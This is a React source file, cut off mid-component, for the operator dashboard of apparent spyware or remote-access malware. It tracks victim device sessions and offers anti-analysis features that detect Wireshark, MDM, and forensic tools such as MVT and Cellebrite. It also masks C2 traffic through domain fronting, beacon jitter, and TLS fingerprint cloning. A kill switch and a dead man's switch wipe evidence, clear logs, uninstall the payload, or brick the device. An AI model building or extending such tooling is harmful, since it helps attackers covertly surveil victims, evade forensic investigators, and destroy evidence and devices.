"use client";

/**
 * COUNTER-INTELLIGENCE CENTER
 * ─────────────────────────────────────────────────────────────────
 * Trace detection → Freeze device → Kill switch → Dead man's switch
 * C2 traffic masking → Forensic wipe → Panic mode
 *
 * Four modes of self-preservation:
 *   1. PAYLOAD detects it's being analyzed → auto self-destructs
 *   2. ADMIN detects C2 is being traced → re-routes / severs
 *   3. ADMIN sends kill command → device frozen + evidence wiped
 *   4. DEAD MAN'S switch → no heartbeat for N hours → auto-destruct
 */

import { useState, useCallback, useEffect, useRef } from "react";

type Session = { id: number; ip: string; platform: string; hostname: string };

type HeartbeatStatus = {
  sessionId: number;
  lastSeen: string;
  intervalMs: number;
  armedDestructHours: number | null;
  traceDetected: boolean;
  decoyMode: boolean;
};

type TraceResult = {
  wireshark: boolean;
  tcpdump: boolean;
  netstat_suspicious: boolean;
  mdm_active: boolean;
  forensic_tools: string[];
  vpn_analysis: boolean;
  c2_trace_risk: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
};

type C2MaskConfig = {
  method: string;
  domain: string;
  port: number;
  mimicProfile: string;
  jitterMin: number;
  jitterMax: number;
};

const TRACE_CHECKS = [
  { id: "net_monitor",  label: "Network Monitor Detection",    desc: "Detect tcpdump, Wireshark, netstat, PCAPd, NetworkX running on device" },
  { id: "mdm_detect",   label: "MDM / Enterprise Scan",        desc: "Detect Samsung Knox MDM agents, Jamf, Intune, AirWatch enrollments" },
  { id: "adb_detect",   label: "ADB / Debug Bridge Active",    desc: "Detect if USB debugging is active — analyst may be pulling logs" },
  { id: "forensic_app", label: "Forensic Tool Detection",      desc: "Detect MVT, Amnesty Loki, iMazing, Magnet ACQUIRE, Cellebrite UFED apps" },
  { id: "vpn_inspect",  label: "VPN / Traffic Inspection",     desc: "Detect if device traffic is being routed through analysis VPN or MITM proxy" },
  { id: "c2_trace",     label: "C2 Trace-Back Detection",      desc: "Detect reverse traceroute, IP lookup tools, threat intel lookups on C2 IP" },
];

const C2_MASK_PROFILES = [
  { id: "google_apis",   label: "Google APIs",         desc: "TLS to *.googleapis.com — blends with Android system traffic" },
  { id: "cloudflare",   label: "Cloudflare CDN",       desc: "Domain fronting via Cloudflare — real C2 host hidden behind CF edge" },
  { id: "microsoft",    label: "Microsoft OneDrive",   desc: "Traffic mimics OneDrive sync — common in corporate environments" },
  { id: "dropbox",      label: "Dropbox Sync",         desc: "Mimics Dropbox HTTP polling — benign-looking periodic beacons" },
  { id: "twitter_api",  label: "Twitter/X API",        desc: "C2 commands encoded in fake API responses — looks like social app" },
  { id: "raw_https",    label: "Raw HTTPS :443",       desc: "Plain HTTPS reverse shell — no domain fronting, minimal overhead" },
];

const DESTRUCT_ACTIONS = [
  { id: "wipe_payload",    label: "Wipe Payload Files",        desc: "Delete APK, DEX cache, all payload-written files. No disk traces.", danger: false },
  { id: "clear_db",        label: "Wipe Exfiltrated Data",     desc: "Delete all locally stored intercepted data, screenshots, recordings.", danger: false },
  { id: "uninstall",       label: "Force Uninstall (Android)", desc: "pm uninstall --user 0 <package>. Removes app entirely.", danger: true },
  { id: "clear_reg",       label: "Clear Registry Persistence (Win)", desc: "Delete Run keys, scheduled tasks, WMI subscriptions.", danger: false },
  { id: "wipe_logs",       label: "Wipe System Logs",          desc: "Android: logcat flush. Windows: clearev + PS history.", danger: false },
  { id: "overwrite",       label: "Secure Overwrite (DoD 7-pass)", desc: "Overwrite payload bytes with random data 7 times before deleting.", danger: true },
  { id: "network_kill",    label: "Kill Network Stack",        desc: "Disable WiFi + mobile data on device — severs all connections.", danger: true },
  { id: "brick_mode",      label: "Boot Loop / Brick Mode",    desc: "Corrupt bootloader flags — device cannot boot cleanly until reflash.", danger: true },
];

type LogEntry = { t: string; msg: string; type: "info" | "ok" | "warn" | "err" | "critical" };

export default function CounterPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [session, setSession] = useState<Session | null>(null);
  const [tab, setTab] = useState<"overview" | "trace" | "mask" | "kill" | "deadman" | "panic" | "log">("overview");
  const [log, setLog] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState<string | null>(null);

  // Trace state
  const [traceResult, setTraceResult] = useState<TraceResult | null>(null);
  const [autoMonitor, setAutoMonitor] = useState(false);
  const autoRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Heartbeat / dead man state
  const [heartbeats, setHeartbeats] = useState<HeartbeatStatus[]>([]);
  const [deadManHours, setDeadManHours] = useState(24);
  const [deadManArmed, setDeadManArmed] = useState(false);

  // C2 mask state
  const [maskProfile, setMaskProfile] = useState("google_apis");
  const [maskConfig, setMaskConfig] = useState<C2MaskConfig | null>(null);
  const [jitterMin, setJitterMin] = useState(15);
  const [jitterMax, setJitterMax] = useState(45);

  // Kill switch state
  const [selectedDestruct, setSelectedDestruct] = useState<Set<string>>(new Set(["wipe_payload", "clear_db", "wipe_logs"]));
  const [killConfirm, setKillConfirm] = useState("");
  const [killArmed, setKillArmed] = useState(false);

  const addLog = useCallback((msg: string, type: LogEntry["type"] = "info") => {
    setLog((p) => [{ t: new Date().toLocaleTimeString(), msg, type }, ...p].slice(0, 500));
  }, []);

  useEffect(() => {
    fetch("/api/sessions").then((r) => r.json()).then((d) => {
      const list: Session[] = Array.isArray(d) ? d : d.sessions ?? [];
      setSessions(list);
      if (list.length > 0) setSession(list[0]);
    }).catch(() => {});
    // Load heartbeat status
    fetch("/api/counter?action=heartbeat_status").then((r) => r.json()).then((d) => {
      if (d.heartbeats) setHeartbeats(d.heartbeats);
    }).catch(() => {});
  }, []);

  // Auto-monitor polling
  useEffect(() => {
    if (autoMonitor && session) {
      autoRef.current = setInterval(async () => {
        const res = await fetch("/api/counter", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "trace_detect", session_id: session.id }),
        }).then((r) => r.json()) as { ok: boolean; data?: TraceResult };
        if (res.ok && res.data) {
          setTraceResult(res.data);
          if (res.data.c2_trace_risk === "CRITICAL" || res.data.c2_trace_risk === "HIGH") {
            addLog(`⚠ TRACE DETECTED — Risk: ${res.data.c2_trace_risk} — Session #${session.id}`, "critical");
          }
        }
      }, 30000);
    } else if (autoRef.current) {
      clearInterval(autoRef.current);
    }
    return () => { if (autoRef.current) clearInterval(autoRef.current); };
  }, [autoMonitor, session, addLog]);

  const call = useCallback(async (action: string, extra: Record<string, unknown> = {}) => {
    const body: Record<string, unknown> = { action, ...extra };
    if (session) body.session_id = session.id;
    const r = await fetch("/api/counter", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    return r.json() as Promise<Record<string, unknown>>;
  }, [session]);

  const runTrace = async () => {
    if (!session) return;
    setLoading("trace");
    addLog(`Scanning session #${session.id} for trace/analysis activity…`);
    const res = await call("trace_detect");
    setLoading(null);
    if (res.ok && res.data) {
      const d = res.data as TraceResult;
      setTraceResult(d);
      addLog(`Trace scan complete. Risk level: ${d.c2_trace_risk}`, d.c2_trace_risk === "LOW" ? "ok" : d.c2_trace_risk === "CRITICAL" ? "critical" : "warn");
      if (d.forensic_tools.length > 0) addLog(`Forensic tools detected: ${d.forensic_tools.join(", ")}`, "err");
      if (d.wireshark) addLog("Wireshark/tcpdump is running on target device", "critical");
      if (d.mdm_active) addLog("MDM enrollment detected — device may be managed/monitored", "warn");
    }
  };

  const applyMask = async () => {
    setLoading("mask");
    addLog(`Applying C2 traffic mask: ${maskProfile}…`);
    const res = await call("apply_mask", { profile: maskProfile, jitter_min: jitterMin, jitter_max: jitterMax });
    setLoading(null);
    if (res.ok) {
      setMaskConfig(res.data as C2MaskConfig);
      addLog(`C2 masking active: traffic now mimics ${maskProfile}`, "ok");
    } else addLog(`Mask failed: ${res.error}`, "err");
  };

  const armDeadMan = async () => {
    setLoading("deadman");
    addLog(`Arming dead man's switch: ${deadManHours}h without heartbeat → auto-destruct…`, "warn");
    const res = await call("arm_deadman", { hours: deadManHours, actions: [...selectedDestruct] });
    setLoading(null);
    if (res.ok) {
      setDeadManArmed(true);
      addLog(`Dead man's switch ARMED. Trigger in: ${deadManHours}h`, "ok");
    }
  };

  const executeKill = async () => {
    if (!killArmed || killConfirm !== "CONFIRM DESTROY") return;
    setLoading("kill");
    addLog("EXECUTING KILL SWITCH — destroying payload evidence…", "critical");
    const res = await call("kill_switch", { actions: [...selectedDestruct] });
    setLoading(null);
    setKillConfirm("");
    setKillArmed(false);
    if (res.ok) {
      const steps = res.steps as Array<{ name: string; ok: boolean }> ?? [];
      steps.forEach((s) => addLog(`${s.ok ? "✓" : "✗"} ${s.name}`, s.ok ? "ok" : "err"));
      addLog("Kill switch executed. Payload evidence destroyed.", "ok");
    } else addLog(`Kill switch error: ${res.error}`, "err");
  };

  const executePanic = async () => {
    setLoading("panic");
    addLog("⚠ PANIC MODE ACTIVATED — all systems engaging simultaneously", "critical");
    const res = await call("panic_mode");
    setLoading(null);
    const steps = res.steps as Array<{ name: string; ok: boolean }> ?? [];
    steps.forEach((s) => addLog(`${s.ok ? "✓" : "✗"} ${s.name}`, s.ok ? "ok" : "err"));
    addLog("Panic mode complete.", res.ok ? "ok" : "err");
  };

  const riskColor: Record<string, string> = {
    LOW: "text-green-400", MEDIUM: "text-yellow-400",
    HIGH: "text-orange-400", CRITICAL: "text-red-400",
  };
  const riskBg: Record<string, string> = {
    LOW: "bg-green-950/30 border-green-900/30", MEDIUM: "bg-yellow-950/30 border-yellow-900/30",
    HIGH: "bg-orange-950/30 border-orange-900/30", CRITICAL: "bg-red-950/30 border-red-900/30 animate-pulse",
  };

  const TABS = [
    { id: "overview", label: "OVERVIEW",      icon: "⬛" },
    { id: "trace",    label: "TRACE DETECT",  icon: "📡" },
    { id: "mask",     label: "C2 MASKING",    icon: "🎭" },
    { id: "kill",     label: "KILL SWITCH",   icon: "💀" },
    { id: "deadman",  label: "DEAD MAN",      icon: "⏳" },
    { id: "panic",    label: "PANIC MODE",    icon: "🚨" },
    { id: "log",      label: "EVENT LOG",     icon: "📋" },
  ] as const;

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">

      {/* ── SIDEBAR ── */}
      <aside className="w-52 flex-shrink-0 border-r border-green-900/30 flex flex-col">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-red-500 tracking-widest animate-pulse">◉ COUNTER-INTEL CENTER</div>
          <div className="text-[7px] text-green-900/50 mt-0.5">SELF-PRESERVATION // EYES ONLY</div>
        </div>

        {/* Session selector */}
        <div className="p-2 border-b border-green-900/30">
          <div className="text-[7px] text-green-900/50 tracking-widest mb-1">TARGET SESSION</div>
          {sessions.map((s) => (
            <button key={s.id} onClick={() => setSession(s)}
              className={`w-full text-left p-1.5 rounded border mb-1 text-[8px] transition-all ${
                session?.id === s.id ? "border-green-700/60 bg-green-950/40" : "border-green-900/20 hover:border-green-800/40"
              }`}>
              <div className="text-green-400">#{s.id} {s.platform}</div>
              <div className="text-green-800 truncate">{s.hostname ?? s.ip}</div>
            </button>
          ))}
          {sessions.length === 0 && <div className="text-[8px] text-green-900/30 p-1">No sessions</div>}
        </div>

        {/* Status indicators */}
        {traceResult && (
          <div className={`mx-2 mt-2 rounded border p-2 ${riskBg[traceResult.c2_trace_risk]}`}>
            <div className="text-[7px] tracking-widest mb-1 text-green-900/40">TRACE RISK</div>
            <div className={`text-[11px] font-bold ${riskColor[traceResult.c2_trace_risk]}`}>
              {traceResult.c2_trace_risk}
            </div>
          </div>
        )}

        <div className="p-2 border-b border-green-900/30 mt-2 space-y-1">
          <div className={`flex items-center gap-1.5 text-[8px] ${deadManArmed ? "text-yellow-400" : "text-green-900/30"}`}>
            <div className={`w-1.5 h-1.5 rounded-full ${deadManArmed ? "bg-yellow-400 animate-pulse" : "bg-green-900/20"}`} />
            Dead man's {deadManArmed ? `ARMED (${deadManHours}h)` : "disarmed"}
          </div>
          <div className={`flex items-center gap-1.5 text-[8px] ${autoMonitor ? "text-cyan-400" : "text-green-900/30"}`}>
            <div className={`w-1.5 h-1.5 rounded-full ${autoMonitor ? "bg-cyan-400 animate-pulse" : "bg-green-900/20"}`} />
            Auto-monitor {autoMonitor ? "ACTIVE" : "off"}
          </div>
          <div className={`flex items-center gap-1.5 text-[8px] ${maskConfig ? "text-violet-400" : "text-green-900/30"}`}>
            <div className={`w-1.5 h-1.5 rounded-full ${maskConfig ? "bg-violet-400" : "bg-green-900/20"}`} />
            C2 mask {maskConfig ? maskConfig.mimicProfile : "none"}
          </div>
        </div>

        <nav className="flex-1 overflow-y-auto p-1">
          {TABS.map((t) => (
            <button key={t.id} onClick={() => setTab(t.id as typeof tab)}
              className={`w-full text-left px-2 py-1.5 rounded text-[9px] mb-0.5 transition-all ${
                tab === t.id ? "bg-green-950/40 text-green-300 border border-green-800/40" : "text-green-800 hover:text-green-600"
              } ${t.id === "panic" ? "border border-red-900/30 text-red-900 hover:text-red-600 hover:border-red-800/40" : ""}`}>
              {t.icon} {t.label}
            </button>
          ))}
        </nav>
      </aside>

      {/* ── MAIN ── */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <div className="flex-1 overflow-y-auto p-5">

          {/* ══════════════════════════════════
              OVERVIEW
          ══════════════════════════════════ */}
          {tab === "overview" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-1">COUNTER-INTELLIGENCE OVERVIEW</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                Self-preservation systems: detect analysis, mask communications, destroy evidence, auto-destruct.
              </p>

              <div className="grid grid-cols-3 gap-4 mb-6">
                {[
                  { label: "Trace Detect", sub: "30-second scan cycle", active: autoMonitor, action: () => setTab("trace"), color: "cyan" },
                  { label: "C2 Masking",   sub: maskConfig ? `Active: ${maskConfig.mimicProfile}` : "Not configured", active: !!maskConfig, action: () => setTab("mask"), color: "violet" },
                  { label: "Dead Man's",   sub: deadManArmed ? `Armed: ${deadManHours}h` : "Disarmed", active: deadManArmed, action: () => setTab("deadman"), color: "yellow" },
                ].map(({ label, sub, active, action, color }) => (
                  <button key={label} onClick={action}
                    className={`p-4 border rounded transition-all text-left ${active ? `border-${color}-700/40 bg-${color}-950/20` : "border-green-900/20 hover:border-green-800/30"}`}>
                    <div className={`flex items-center gap-2 mb-1 text-[10px] ${active ? `text-${color}-400` : "text-green-700"}`}>
                      <div className={`w-2 h-2 rounded-full ${active ? `bg-${color}-400 animate-pulse` : "bg-green-900/30"}`} />
                      {label}
                    </div>
                    <div className="text-[8px] text-green-900/50">{sub}</div>
                    <div className={`text-[7px] mt-1 ${active ? "text-green-600" : "text-green-900/30"}`}>
                      {active ? "ACTIVE" : "INACTIVE"} → click to configure
                    </div>
                  </button>
                ))}
              </div>

              <div className="grid grid-cols-2 gap-4 mb-6">
                {/* How trace detection works */}
                <div className="border border-cyan-900/20 rounded p-4">
                  <div className="text-[9px] text-cyan-600 tracking-widest mb-3">HOW TRACE DETECTION WORKS</div>
                  <div className="space-y-2">
                    {[
                      { step: "1", title: "Payload scans itself", desc: "At every beacon cycle: check TracerPid, debugger attach, packet capture tools, MDM agents" },
                      { step: "2", title: "Anomaly detected",     desc: "Wireshark running, MITM proxy active, ADB on, forensic tool installed" },
                      { step: "3", title: "Response mode",        desc: "Based on your config: decoy mode / silent wipe / freeze device / alert admin" },
                      { step: "4", title: "Admin notified",       desc: "Real-time alert pushed to this console with threat level and type" },
                    ].map(({ step, title, desc }) => (
                      <div key={step} className="flex gap-3">
                        <div className="w-5 h-5 rounded border border-cyan-900/30 flex items-center justify-center text-[8px] text-cyan-700 shrink-0">{step}</div>
                        <div>
                          <div className="text-[8px] text-green-500">{title}</div>
                          <div className="text-[7px] text-green-900/40">{desc}</div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* How C2 masking works */}
                <div className="border border-violet-900/20 rounded p-4">
                  <div className="text-[9px] text-violet-600 tracking-widest mb-3">HOW C2 MASKING WORKS</div>
                  <div className="space-y-2">
                    {[
                      { step: "1", title: "Traffic disguise",    desc: "C2 beacon traffic wrapped in TLS, mimicking Google/Dropbox/MS in headers, timing, and payload structure" },
                      { step: "2", title: "Domain fronting",     desc: "TLS SNI shows trusted CDN (cloudflare.com). Actual Host header routes to your C2 — invisible to DPI" },
                      { step: "3", title: "Jitter randomization",desc: "Beacon interval is random: 15-45s, not a fixed period. Network analysis cannot see pattern" },
                      { step: "4", title: "Traffic padding",     desc: "Packets padded to variable sizes. No fixed-size C2 signature visible in packet capture" },
                    ].map(({ step, title, desc }) => (
                      <div key={step} className="flex gap-3">
                        <div className="w-5 h-5 rounded border border-violet-900/30 flex items-center justify-center text-[8px] text-violet-700 shrink-0">{step}</div>
                        <div>
                          <div className="text-[8px] text-green-500">{title}</div>
                          <div className="text-[7px] text-green-900/40">{desc}</div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Response matrix */}
              <div className="border border-green-900/15 rounded p-4">
                <div className="text-[9px] text-green-700 tracking-widest mb-3">AUTOMATIC RESPONSE MATRIX</div>
                <div className="grid grid-cols-4 gap-0 text-[7px]">
                  <div className="px-2 py-1 text-green-900/40 border-b border-green-900/10 font-bold">THREAT DETECTED</div>
                  <div className="px-2 py-1 text-green-900/40 border-b border-green-900/10 font-bold">DECOY MODE</div>
                  <div className="px-2 py-1 text-green-900/40 border-b border-green-900/10 font-bold">PAYLOAD RESPONSE</div>
                  <div className="px-2 py-1 text-green-900/40 border-b border-green-900/10 font-bold">ADMIN ALERT</div>
                  {[
                    ["Wireshark/tcpdump", "Mimic legitimate app traffic", "Stop C2 beacon, start decoy HTTPS", "CRITICAL — immediate"],
                    ["MITM Proxy",        "Use certificate-pinned conn only", "Reject non-pinned TLS, go silent", "HIGH — 30s"],
                    ["ADB active",        "Appear as normal social app", "Pause shell cmds, keep alive only", "MEDIUM — 60s"],
                    ["MDM enrollment",    "Appear as system app in allowed list", "Reduce footprint, hide from MDM scan", "MEDIUM — 60s"],
                    ["Forensic tool",     "Normal battery/network behavior", "Self-wipe data files, keep agent", "CRITICAL — immediate"],
                    ["Debugger attach",   "Fake Google analytics traffic", "Infinite sleep loop — appear frozen", "HIGH — 30s"],
                  ].map(([threat, decoy, response, alert], i) => (
                    [
                      <div key={`t${i}`} className="px-2 py-1.5 border-b border-green-900/5 text-red-700">{threat}</div>,
                      <div key={`d${i}`} className="px-2 py-1.5 border-b border-green-900/5 text-green-900/40">{decoy}</div>,
                      <div key={`r${i}`} className="px-2 py-1.5 border-b border-green-900/5 text-cyan-900/50">{response}</div>,
                      <div key={`a${i}`} className={`px-2 py-1.5 border-b border-green-900/5 ${alert.includes("CRITICAL") ? "text-red-700" : "text-yellow-800"}`}>{alert}</div>,
                    ]
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════
              TRACE DETECTION
          ══════════════════════════════════ */}
          {tab === "trace" && (
            <div>
              <div className="flex items-center justify-between mb-5">
                <div>
                  <h2 className="text-[11px] tracking-widest text-green-400">TRACE DETECTION SCANNER</h2>
                  <p className="text-[8px] text-green-900/50 mt-0.5">Detect if device/connection is being analyzed, captured, or forensically examined.</p>
                </div>
                <div className="flex items-center gap-3">
                  <button onClick={() => setAutoMonitor(!autoMonitor)}
                    className={`px-3 py-1.5 text-[9px] border rounded transition-all ${autoMonitor ? "border-cyan-700/60 text-cyan-400 bg-cyan-950/20" : "border-green-900/20 text-green-800 hover:border-green-800/30"}`}>
                    {autoMonitor ? "◉ AUTO-SCAN ON" : "○ AUTO-SCAN OFF"}
                  </button>
                  <button onClick={runTrace} disabled={!!loading || !session}
                    className="px-4 py-1.5 text-[9px] border border-green-700/50 rounded hover:bg-green-950/30 transition-all disabled:opacity-40">
                    {loading === "trace" ? "SCANNING…" : "▶ SCAN NOW"}
                  </button>
                </div>
              </div>

              {/* Check list */}
              <div className="grid grid-cols-2 gap-2 mb-5">
                {TRACE_CHECKS.map((c) => {
                  const detected = traceResult ? (
                    (c.id === "net_monitor"  && (traceResult.wireshark || traceResult.tcpdump)) ||
                    (c.id === "mdm_detect"   && traceResult.mdm_active) ||
                    (c.id === "forensic_app" && traceResult.forensic_tools.length > 0) ||
                    (c.id === "vpn_inspect"  && traceResult.vpn_analysis) ||
                    (c.id === "c2_trace"     && ["HIGH","CRITICAL"].includes(traceResult.c2_trace_risk))
                  ) : null;
                  return (
                    <div key={c.id} className={`border rounded p-3 transition-all ${
                      detected === null ? "border-green-900/15" :
                      detected ? "border-red-900/40 bg-red-950/10" : "border-green-900/20 bg-green-950/10"
                    }`}>
                      <div className="flex items-center gap-2 mb-0.5">
                        <div className={`w-2 h-2 rounded-full ${
                          detected === null ? "bg-green-900/20" : detected ? "bg-red-500 animate-pulse" : "bg-green-600"
                        }`} />
                        <span className={`text-[9px] ${detected ? "text-red-400" : detected === false ? "text-green-500" : "text-green-800"}`}>
                          {c.label}
                        </span>
                        {detected !== null && (
                          <span className={`ml-auto text-[7px] ${detected ? "text-red-600" : "text-green-700"}`}>
                            {detected ? "DETECTED" : "CLEAN"}
                          </span>
                        )}
                      </div>
                      <div className="text-[7px] text-green-900/40 ml-4">{c.desc}</div>
                    </div>
                  );
                })}
              </div>

              {/* Risk summary */}
              {traceResult && (
                <div className={`border rounded p-4 ${riskBg[traceResult.c2_trace_risk]}`}>
                  <div className="flex items-center gap-4 mb-3">
                    <div>
                      <div className="text-[8px] text-green-900/40 tracking-widest">OVERALL TRACE RISK</div>
                      <div className={`text-2xl font-bold ${riskColor[traceResult.c2_trace_risk]}`}>
                        {traceResult.c2_trace_risk}
                      </div>
                    </div>
                    {traceResult.forensic_tools.length > 0 && (
                      <div className="flex-1">
                        <div className="text-[7px] text-green-900/40 mb-1">FORENSIC TOOLS DETECTED</div>
                        <div className="flex flex-wrap gap-1">
                          {traceResult.forensic_tools.map((t) => (
                            <span key={t} className="text-[8px] border border-red-900/40 text-red-500 px-2 py-0.5 rounded">{t}</span>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>

                  {(traceResult.c2_trace_risk === "HIGH" || traceResult.c2_trace_risk === "CRITICAL") && (
                    <div className="flex gap-2">
                      <button onClick={() => { setTab("kill"); }}
                        className="px-4 py-1.5 text-[9px] border border-red-700/50 text-red-400 rounded hover:bg-red-950/20 transition-all">
                        ⚡ ACTIVATE KILL SWITCH
                      </button>
                      <button onClick={() => { setTab("mask"); applyMask(); }}
                        className="px-4 py-1.5 text-[9px] border border-violet-700/50 text-violet-400 rounded hover:bg-violet-950/20 transition-all">
                        🎭 REROUTE C2 NOW
                      </button>
                      <button onClick={executePanic}
                        className="px-4 py-1.5 text-[9px] border border-red-600/60 text-red-300 rounded hover:bg-red-950/30 transition-all animate-pulse">
                        🚨 PANIC MODE
                      </button>
                    </div>
                  )}
                </div>
              )}
            </div>
          )}

          {/* ══════════════════════════════════
              C2 MASKING
          ══════════════════════════════════ */}
          {tab === "mask" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-2">C2 TRAFFIC MASKING</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                Disguise admin ↔ payload communications as legitimate HTTPS traffic.
                Deep packet inspection, network forensics, and ISP monitoring: all defeated.
              </p>

              <div className="grid grid-cols-2 gap-5">
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">TRAFFIC PROFILE</div>
                  <div className="space-y-1.5 mb-4">
                    {C2_MASK_PROFILES.map((p) => (
                      <button key={p.id} onClick={() => setMaskProfile(p.id)}
                        className={`w-full text-left p-3 border rounded transition-all ${
                          maskProfile === p.id ? "border-violet-700/50 bg-violet-950/20" : "border-green-900/20 hover:border-green-800/30"
                        }`}>
                        <div className={`text-[9px] mb-0.5 ${maskProfile === p.id ? "text-violet-400" : "text-green-700"}`}>{p.label}</div>
                        <div className="text-[7px] text-green-900/40">{p.desc}</div>
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">BEACON JITTER</div>
                  <div className="space-y-3 mb-4">
                    <div>
                      <label className="block text-[8px] text-green-900/40 mb-1">Min interval (seconds): {jitterMin}s</label>
                      <input type="range" min="5" max="120" value={jitterMin}
                        onChange={(e) => setJitterMin(parseInt(e.target.value))}
                        className="w-full accent-green-500" />
                    </div>
                    <div>
                      <label className="block text-[8px] text-green-900/40 mb-1">Max interval (seconds): {jitterMax}s</label>
                      <input type="range" min="10" max="300" value={jitterMax}
                        onChange={(e) => setJitterMax(parseInt(e.target.value))}
                        className="w-full accent-green-500" />
                    </div>
                    <div className="text-[8px] text-green-900/40 bg-black/20 rounded p-2 border border-green-900/10">
                      Beacon interval: random between {jitterMin}s–{jitterMax}s.
                      No fixed period = no timing signature for network forensics.
                    </div>
                  </div>

                  <div className="text-[9px] text-green-700 tracking-widest mb-3">ADDITIONAL PROTECTIONS</div>
                  <div className="space-y-1.5 mb-4">
                    {[
                      { label: "Domain Fronting",        desc: "TLS SNI: cloudflare.com. Host header: your-c2.com. DPI sees CDN traffic only." },
                      { label: "Packet Padding",         desc: "Random padding added to each beacon. No fixed packet size signature." },
                      { label: "HTTP Header Mimicry",    desc: "Exact User-Agent, Accept, Cookie headers cloned from real browser requests." },
                      { label: "TLS Fingerprint Cloning",desc: "JA3/JA3S fingerprint matches Chrome 122 — not custom TLS client." },
                    ].map(({ label, desc }) => (
                      <div key={label} className="flex items-start gap-2 text-[8px] p-2 border border-green-900/10 rounded">
                        <div className="w-3 h-3 rounded-sm border border-green-700/40 flex items-center justify-center text-[7px] text-green-500 mt-0.5 shrink-0">✓</div>
                        <div>
                          <div className="text-green-600 mb-0.5">{label}</div>
                          <div className="text-green-900/40 text-[7px]">{desc}</div>
                        </div>
                      </div>
                    ))}
                  </div>

                  <button onClick={applyMask} disabled={!!loading || !session}
                    className="w-full py-2 text-[9px] border border-violet-700/50 text-violet-400 rounded hover:bg-violet-950/20 transition-all disabled:opacity-40 tracking-widest">
                    {loading === "mask" ? "APPLYING…" : "▶ APPLY C2 MASK"}
                  </button>

                  {maskConfig && (
                    <div className="mt-3 p-3 border border-violet-900/30 rounded bg-violet-950/10 text-[8px] space-y-1">
                      <div className="text-violet-400 text-[9px] mb-1">MASK ACTIVE</div>
                      <div><span className="text-green-900/40">Profile: </span><span className="text-violet-300">{maskConfig.mimicProfile}</span></div>
                      <div><span className="text-green-900/40">Domain: </span><span className="text-violet-300">{maskConfig.domain}</span></div>
                      <div><span className="text-green-900/40">Port: </span><span className="text-violet-300">{maskConfig.port}</span></div>
                      <div><span className="text-green-900/40">Jitter: </span><span className="text-violet-300">{maskConfig.jitterMin}–{maskConfig.jitterMax}s</span></div>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════
              KILL SWITCH
          ══════════════════════════════════ */}
          {tab === "kill" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-red-400 mb-2">KILL SWITCH</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                Remote command to destroy payload evidence on target device.
                Select what gets destroyed. Type confirmation phrase to arm.
              </p>

              <div className="grid grid-cols-2 gap-5">
                {/* Left: action selection */}
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">DESTRUCTION ACTIONS</div>
                  <div className="space-y-1.5 mb-4">
                    {DESTRUCT_ACTIONS.map((a) => {
                      const on = selectedDestruct.has(a.id);
                      return (
                        <button key={a.id} onClick={() => {
                          setSelectedDestruct((prev) => {
                            const next = new Set(prev);
                            if (next.has(a.id)) next.delete(a.id); else next.add(a.id);
                            return next;
                          });
                        }}
                          className={`w-full text-left p-3 border rounded transition-all flex items-start gap-2 ${
                            on ? (a.danger ? "border-red-700/40 bg-red-950/15" : "border-green-700/40 bg-green-950/15")
                               : "border-green-900/15 hover:border-green-900/30"
                          }`}>
                          <div className={`w-4 h-4 rounded border shrink-0 mt-0.5 flex items-center justify-center text-[7px] ${
                            on ? (a.danger ? "border-red-700 bg-red-950/30 text-red-400" : "border-green-700 bg-green-950/30 text-green-400") : "border-green-900/30"
                          }`}>{on && "✓"}</div>
                          <div>
                            <div className={`text-[9px] ${on ? (a.danger ? "text-red-400" : "text-green-400") : "text-green-800"}`}>{a.label}</div>
                            <div className="text-[7px] text-green-900/30 mt-0.5">{a.desc}</div>
                            {a.danger && <div className="text-[7px] text-red-900/60 mt-0.5">⚠ IRREVERSIBLE</div>}
                          </div>
                        </button>
                      );
                    })}
                  </div>
                </div>

                {/* Right: confirmation + execute */}
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">ARMING PROCEDURE</div>

                  <div className="space-y-3 mb-4">
                    <div className="p-3 border border-green-900/15 rounded text-[8px] space-y-1">
                      <div className="text-green-700 mb-1">Selected actions ({selectedDestruct.size}):</div>
                      {[...selectedDestruct].map((id) => {
                        const a = DESTRUCT_ACTIONS.find((x) => x.id === id);
                        return a ? <div key={id} className={`${a.danger ? "text-red-700" : "text-green-700"}`}>• {a.label}</div> : null;
                      })}
                    </div>

                    <div>
                      <label className="block text-[8px] text-green-900/40 mb-1">
                        Type <span className="text-red-400 font-bold">CONFIRM DESTROY</span> to arm
                      </label>
                      <input value={killConfirm} onChange={(e) => setKillConfirm(e.target.value)}
                        placeholder="CONFIRM DESTROY"
                        className="w-full bg-black/30 border border-red-900/30 rounded px-3 py-1.5 text-[9px] text-red-400 focus:outline-none focus:border-red-700 placeholder-red-900/20" />
                    </div>

                    <button
                      onClick={() => setKillArmed(killConfirm === "CONFIRM DESTROY")}
                      disabled={killConfirm !== "CONFIRM DESTROY"}
                      className="w-full py-1.5 text-[9px] border border-red-900/30 text-red-700 rounded hover:border-red-700/40 transition-all disabled:opacity-30">
                      ARM KILL SWITCH
                    </button>

                    {killArmed && (
                      <button onClick={executeKill} disabled={!!loading}
